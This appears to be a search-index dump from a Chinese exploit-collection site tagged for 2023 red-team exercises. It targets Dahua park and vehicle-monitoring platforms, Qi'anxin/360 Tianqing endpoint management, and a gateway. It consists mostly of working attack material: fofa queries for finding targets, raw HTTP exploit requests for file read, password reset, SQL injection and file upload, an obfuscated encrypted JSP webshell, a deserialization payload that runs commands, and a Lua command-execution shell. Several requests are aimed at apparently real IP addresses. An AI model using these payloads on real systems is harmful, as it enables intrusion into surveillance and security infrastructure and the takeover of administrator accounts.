AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip, deflate Connection: close ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-searchjson-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"大华智慧园区综合管理平台 searchJson SQL注入漏洞","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-searchjson-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" product=\"dahua-智慧园区综合管理平台\" ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-sourcepublishingpublishingmaterialfilevideo-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"大华智慧园区综合管理平台 sourcepublishingpublishingmaterialfilevideo 文件上传漏洞","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-sourcepublishingpublishingmaterialfilevideo-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc http://110.188.114.27:30000/publishingImg/VIDEO/230809113241124030.txt POST /publishing/publishing/material/file/video HTTP/1.1 Host: 110.188.114.27:30000 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7 Accept-Encoding: gzip Content-Length: 151 --dd8f988919484abab3816881c55272a7 Content-Disposition: form-data; name=\"Filedata\"; filename=\"test.txt\" test --dd8f988919484abab3816881c55272a7-- ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-sourcepublishingpublishingmaterialfilevideo-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"大华智慧园区综合管理平台 sourcepublishingpublishingmaterialfilevideo 文件上传漏洞","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-sourcepublishingpublishingmaterialfilevideo-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"大华智慧园区综合管理平台 文件上传漏洞 POST /publishing/publishing/material/file/video HTTP/1.1 Host: 127.0.0.1:7443 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 804 Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7 Accept-Encoding: gzip, deflate Connection: close --dd8f988919484abab3816881c55272a7 Content-Disposition: form-data; name=\"Filedata\"; filename=\"0EaE10E7dF5F10C2.jsp\" \u003c%@page contentType=\"text/html; charset=GBK\"%\u003e\u003c%@page import=\"java.math.BigInteger\"%\u003e\u003c%@page import=\"java.security.MessageDigest\"%\u003e\u003c% MessageDigest md5 = null;md5 = MessageDigest.getInstance(\"MD5\");String s = \"123456\";String miyao = \"\";String jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new java.io.File(application.getRealPath(request.getServletPath())).delete();%\u003e --dd8f988919484abab3816881c55272a7 Content-Disposition: form-data; name=\"poc\" poc --dd8f988919484abab3816881c55272a7 Content-Disposition: form-data; name=\"Submit\" submit --dd8f988919484abab3816881c55272a7-- ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"大华智慧园区综合管理平台 文件上传漏洞","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"大华智能物联ICC综合管理平台readpic任意文件读取漏洞 大华智慧园区综合管理平台是一款综合管理平台，具备园区运营、资源调配和智能服务等功能。该平台的 “readpic” 接口存在一个任意文件读取漏洞，恶意攻击者可通过文件读取漏洞进行访问和读取系统中的文件，包括配置文件、日志和其他敏感数据，从而利用攻击。 ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94icc%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0readpic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"大华智能物联ICC综合管理平台readpic任意文件读取漏洞","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94icc%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0readpic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa :body=\"*客户端会小于800*\" ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94icc%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0readpic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"大华智能物联ICC综合管理平台readpic任意文件读取漏洞","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94icc%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0readpic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc GET /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd HTTP/2 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 If-None-Match: W/\"63ba2750-93e\" Te: trailers ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94icc%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0readpic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"大华智能物联ICC综合管理平台readpic任意文件读取漏洞","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94icc%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0readpic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\ricon_hash=\"411052691\" title==\"Exception\" \u0026\u0026 \"系统正忙，请稍后重试\" ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E8%BD%A6%E8%BD%BD%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0/:0:0","tags":["2023hw"],"title":"大华车载监控平台","uri":"/%E5%A4%A7%E5%8D%8E%E8%BD%A6%E8%BD%BD%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0/"},{"categories":["2023hw"],"content":"登录口 https://221.5.65.82:899/admin/login_login.action# https://221.5.65.82:899/config/user_toLoginPage.action ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E8%BD%A6%E8%BD%BD%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0/:1:0","tags":["2023hw"],"title":"大华车载监控平台","uri":"/%E5%A4%A7%E5%8D%8E%E8%BD%A6%E8%BD%BD%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0/"},{"categories":["2023hw"],"content":"配置系统任意密码重置 修改为admin/Aa112233 POST /config/user_passwordReset.action?nowTime=1662449299721 HTTP/1.1 Host: 221.5.65.82:899 Connection: close Content-Length: 346 sec-ch-ua: \"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\" Accept: text/plain, */*; q=0.01 Content-Type: application/x-www-form-urlencoded;charset=UTF-8 X-Requested-With: XMLHttpRequest sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 sec-ch-ua-platform: \"macOS\" Origin: https://221.5.65.82:899 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://221.5.65.82:899/config/user_initPasswordReset.action?t=1662449256362 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=8EFCAC96D2EEF42CA0F7ACA18C491016; random=7j0fstzufuu; JSESSIONID=A6683C873CB8549B04A50677BE1BA39A userBean.loginName=admin\u0026userBean.loginPass=%24D%24S%24S%240778d46eadf8a31cb00ce8d1be64e12e\u0026userBean.questionNumber1=6\u0026userBean.questionAnswer1=1d0383dcf3670a5ea80b017382d66623\u0026userBean.questionNumber2=1\u0026userBean.questionAnswer2=1d0383dcf3670a5ea80b017382d66623\u0026userBean.questionNumber3=7\u0026userBean.questionAnswer3=1d0383dcf3670a5ea80b017382d66623 ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E8%BD%A6%E8%BD%BD%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0/:2:0","tags":["2023hw"],"title":"大华车载监控平台","uri":"/%E5%A4%A7%E5%8D%8E%E8%BD%A6%E8%BD%BD%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0/"},{"categories":["2023hw"],"content":"车载监控平台密码重置(密保1才可) 修改为system/Aa112233 POST /admin/login_updatePass.action?nowTime=1662450246031 HTTP/1.1 Host: 221.5.65.82:899 Connection: close Content-Length: 228 Pragma: no-cache Cache-Control: no-cache sec-ch-ua: \"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\" Accept: application/json, text/javascript, */*; q=0.01 Content-Type: application/x-www-form-urlencoded;charset=UTF-8 X-Requested-With: XMLHttpRequest sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 sec-ch-ua-platform: \"macOS\" Origin: https://221.5.65.82:899 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://221.5.65.82:899/admin/login_login.action Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: userNameArray=system; random=fj8b4raskbc; JSESSIONID=958F2BB3F054FA04324881161DE7361A; JSESSIONID=A6683C873CB8549B04A50677BE1BA39A userBean.newLoginPass=6fb188a448d824278fa7fdf0bccc97ce\u0026userBean.questionAnswer1=a0b5d0071821c2d338d05f1127a1b93c\u0026userBean.questionAnswer2=a0b5d0071821c2d338d05f1127a1b93c\u0026userBean.questionAnswer3=a0b5d0071821c2d338d05f1127a1b93c ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E8%BD%A6%E8%BD%BD%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0/:3:0","tags":["2023hw"],"title":"大华车载监控平台","uri":"/%E5%A4%A7%E5%8D%8E%E8%BD%A6%E8%BD%BD%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0/"},{"categories":["2023hw"],"content":"任意文件上传 ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E8%BD%A6%E8%BD%BD%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0/:4:0","tags":["2023hw"],"title":"大华车载监控平台","uri":"/%E5%A4%A7%E5%8D%8E%E8%BD%A6%E8%BD%BD%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0/"},{"categories":["2023hw"],"content":"上传 默认9002端口 冰蝎马 9002/tcp open dynamid POST /vehicleServer/carDev/icon/import/1?iconType=1 HTTP/1.1 Host: 218.75.146.232:9002 Accept: */* Accept-Encoding: gzip, deflate, br Content-Length: 872 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydoqRz6gbJn1soiTe Origin: https://218.75.146.232:9999 Referer: https://218.75.146.232:9999/views/client.html User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.9.1 Chrome/56.0.2924.122 Safari/537.36 ------WebKitFormBoundarydoqRz6gbJn1soiTe Content-Disposition: form-data; name=\"file\"; filename=\"222.jsp\" Content-Type: image/png GIF89a \u003c%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%\u003e\u003c%!class HFDB extends ClassLoader{HFDB(ClassLoader UYGS){super(UYGS);}public Class OANU(byte []b){return super.d\\uuuuuuuuuuuuuuuuuuuuuuuuuuuu0065fineClass(b,0,b.length);}}%\u003e\u003c%if (request.\\u0067etMethod().\\u0065quals(\"POST\")){String WRQO=\"e45e329feb5d925b\";session.putValue(\"u\",WRQO);Cipher UYGS=Cipher.\\u0067etInstance(\"AES\");UYGS.init(2,new SecretKeySpec(WRQO.\\u0067etBytes(),\"AES\"));new HFDB(this.\\u0067etClass().\\u0067etClassLoader()).OANU(UYGS.doFinal(new sun.misc.\\u0042A\\u0053E\\u00364De\\u0063o\\u0064\\u0065\\u0072().d\\u0065codeBuffer(request.\\u0067etReader().readLine()))).newInstance().\\u0065quals(pageContext);}%\u003e ------WebKitFormBoundarydoqRz6gbJn1soiTe-- ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E8%BD%A6%E8%BD%BD%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0/:4:1","tags":["2023hw"],"title":"大华车载监控平台","uri":"/%E5%A4%A7%E5%8D%8E%E8%BD%A6%E8%BD%BD%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0/"},{"categories":["2023hw"],"content":"获取路径 GET /vehicleServer/carDev/icon/getIconList?nowTime=164605907220 HTTP/1.1 Host: 218.75.146.232:9002 Connection: close Pragma: no-cache Cache-Control: no-cache sec-ch-ua: \"Google Chrome\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\" sec-ch-ua-mobile: ?0 sec-ch-ua-platform: \"macOS\" Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=7853B040E156BC79C6664CAF429AA5E7 https://218.75.146.232:9999/upload/vec_saas/vehicleType/icon/1cccc944144f4668b29fe7a2b17b3b44.jsp ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E8%BD%A6%E8%BD%BD%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0/:4:2","tags":["2023hw"],"title":"大华车载监控平台","uri":"/%E5%A4%A7%E5%8D%8E%E8%BD%A6%E8%BD%BD%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0/"},{"categories":["2023hw"],"content":"## fofa\rtitle=\"360新天擎\" || body=\"appid\\\":\\\"skylar6\" || body=\"/task/index/detail?id={item.id}\" || body=\"已过期或者未授权，购买请联系4008-136-360\" || title=\"360天擎\" || title=\"360天擎终端安全管理系统\" ","date":"2023-12-08","objectID":"/%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-yii_csrf_token-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"天擎终端安全管理系统 YII_CSRF_TOKEN 远程代码执行漏洞","uri":"/%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-yii_csrf_token-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc GET /runtime/state.bin HTTP/1.1 Host: 218.2.231.183:9080 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip GET /%3Cscript+language=%22php%22%3Esystem%28%22whoami%22%29;%3C/script%3E HTTP/1.1 Host: 218.2.231.183:9080 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip GET /login?refer=%2F HTTP/1.1 Host: 218.2.231.183:9080 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Cookie: YII_CSRF_TOKEN=f4a2f9c997317926f6563192a3b3646417050c16O%3A24%3A%22Smarty_Internal_Template%22%3A1%3A%7Bs%3A6%3A%22smarty%22%3BO%3A10%3A%22CWebModule%22%3A2%3A%7Bs%3A20%3A%22%00CModule%00_components%22%3Ba%3A0%3A%7B%7Ds%3A25%3A%22%00CModule%00_componentConfig%22%3Ba%3A1%3A%7Bs%3A13%3A%22cache_locking%22%3Ba%3A4%3A%7Bs%3A5%3A%22class%22%3Bs%3A11%3A%22CUrlManager%22%3Bs%3A12%3A%22urlRuleClass%22%3Bs%3A14%3A%22CConfiguration%22%3Bs%3A5%3A%22rules%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A21%3A%22..%2Fwww%2Flogs%2Ferror.log%22%3B%7Ds%3A9%3A%22UrlFormat%22%3Bs%3A4%3A%22path%22%3B%7D%7D%7D%7D Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-yii_csrf_token-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"天擎终端安全管理系统 YII_CSRF_TOKEN 远程代码执行漏洞","uri":"/%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-yii_csrf_token-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"gobyexp POST /api/v1/debugExp HTTP/1.1 Content-Type: application/json;charset=UTF-8 Authorization: Basic dXNlcjpwYXNz host: 82.156.29.211:8365 Connection: close Content-Length: 112 {\"hostinfo\":\"http://218.2.231.183:9080\",\"vulfile\":\"CVD-2023-2433.go\",\"expparams\":{\"cmd\":\"system(\\\"ipconfig\\\")\"}} ","date":"2023-12-08","objectID":"/%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-yii_csrf_token-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"天擎终端安全管理系统 YII_CSRF_TOKEN 远程代码执行漏洞","uri":"/%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-yii_csrf_token-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rhttp://114.113.151.164:28080/api/dp/loglastsync?ccid=a%27));create+table+O(T+TEXT);insert+into+O(T)+values(‘if+ngx.req.get_uri_args().cmd+then+cmd+=+ngx.req.get_uri_args().cmd+local+t+=+io.popen(cmd)+local+a+=+t:read(\"*all\")+ngx.say(a)+end’);copy+O(T)+to+‘errornginx/lua/testb367.luac’;drop+table+O;+–+aa ","date":"2023-12-08","objectID":"/%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Floglastsync%E6%96%B9%E6%B3%95sql%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"天擎终端安全管理系统loglastsync方法SQL注入导致命令执行漏洞","uri":"/%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Floglastsync%E6%96%B9%E6%B3%95sql%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"天钥网关前台SQL注入 POST /ops/index.php?c=Reportguide\u0026a=checkrn HTTP/1.1 Host: **** Connection: close Cache-Control: max-age=0 sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Language: zh-CN,zh;q=0.9 Cookie: **** Content-Type: application/x-www-form-urlencoded Content-Length: 39 checkname=123\u0026tagid=123 sqlmap -u \"https://****/ops/index.php?c=Reportguide\u0026a=checkrn\" --data \"checkname=123\u0026tagid=123\" -v3 --skip-waf --random-agent ","date":"2023-12-08","objectID":"/%E5%A4%A9%E9%92%A5%E7%BD%91%E5%85%B3%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/:1:0","tags":["2023hw漏洞"],"title":"天钥网关前台SQL注入","uri":"/%E5%A4%A9%E9%92%A5%E7%BD%91%E5%85%B3%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"奇安信360天擎getsimilarlistSQL注入漏洞 ","date":"2023-12-08","objectID":"/%E5%A5%87%E5%AE%89%E4%BF%A1360%E5%A4%A9%E6%93%8Egetsimilarlistsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"奇安信360天擎getsimilarlistSQL注入漏洞","uri":"/%E5%A5%87%E5%AE%89%E4%BF%A1360%E5%A4%A9%E6%93%8Egetsimilarlistsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa body=\"/task/index/detail?id={item.id}\" title=\"360新天擎\" ","date":"2023-12-08","objectID":"/%E5%A5%87%E5%AE%89%E4%BF%A1360%E5%A4%A9%E6%93%8Egetsimilarlistsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"奇安信360天擎getsimilarlistSQL注入漏洞","uri":"/%E5%A5%87%E5%AE%89%E4%BF%A1360%E5%A4%A9%E6%93%8Egetsimilarlistsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"POC GET /api/client/getsimilarlist?status[0,1%29+union+all+select+%28%2F%2A%2150000select%2A%2F+79787337%29%2C+setting%2C+setting%2C+status%2C+name%2C+create_time+from+%22user%22+where+1+in+%281]=1\u0026status[0]=1 HTTP/1.1 ","date":"2023-12-08","objectID":"/%E5%A5%87%E5%AE%89%E4%BF%A1360%E5%A4%A9%E6%93%8Egetsimilarlistsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"奇安信360天擎getsimilarlistSQL注入漏洞","uri":"/%E5%A5%87%E5%AE%89%E4%BF%A1360%E5%A4%A9%E6%93%8Egetsimilarlistsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /rptsvr/upload HTTP/1.1 Host: User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: boundary=—————————55433477442814818502792421460 Content-Length: 388 Connection: close Cookie: SKYLARa7e3918c30fdaa641ea1fc2f0c=iouj4m7as0bi041r7eeip52tv0; YII_CSRF_TOKEN=451a827a59b5e2917bf1e1681ac7ba7d1351d346s%3A40%3A%22ec274984d6d6008386d91 140b21666bc52ad1d0f%22%3B Upgrade-Insecure-Requests: 1 —————————–55433477442814818502792421460 Content-Disposition: form-data; name=“uploadfile”; filename=\"../../../application/api/controllers/TController.php\" Content-Type: text/x-python \u003c?php\rclass TController extends BaseApiController {\rprotected function beforeAction($action) {\rreturn true; }\rpublic function actionT() {\rphpinfo(); }\r}\r?\u003e\r—————————–55433477442814818502792421460 Content-Disposition: form-data; name=“token” skylar_report —————————–55433477442814818502792421460 ","date":"2023-12-08","objectID":"/%E5%A5%87%E5%AE%89%E4%BF%A1%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-v6.7.0.4130-rptsvr-upload-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"奇安信天擎终端安全管理系统 V6.7.0.4130 rptsvr upload 前台文件上传漏洞","uri":"/%E5%A5%87%E5%AE%89%E4%BF%A1%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-v6.7.0.4130-rptsvr-upload-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## 